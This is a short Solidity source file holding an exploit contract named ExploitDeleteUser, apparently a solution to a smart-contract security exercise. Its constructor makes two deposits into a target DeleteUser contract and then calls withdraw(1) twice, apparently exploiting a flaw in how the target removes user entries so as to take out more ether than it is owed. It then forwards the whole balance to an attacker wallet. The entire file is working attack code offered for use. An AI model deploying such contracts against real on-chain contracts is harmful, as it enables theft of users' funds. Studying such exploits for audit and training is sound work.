// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./DeleteUser.sol";

contract ExploitDeleteUser {
    DeleteUser targetContract;
    address payable attackerWallet;

    constructor(address _targetContract, address _attackerWallet) payable {
        targetContract = DeleteUser(_targetContract);
        attackerWallet = payable(_attackerWallet);
        targetContract.deposit{value: 2 ether}();
        targetContract.deposit{value: 1 ether}();
        targetContract.withdraw(1);
        targetContract.withdraw(1);
        uint256 balance = address(this).balance;
        (bool success, ) = attackerWallet.call{value: balance}("");
        require(success, "Call to attacker wallet failed");
    }
}
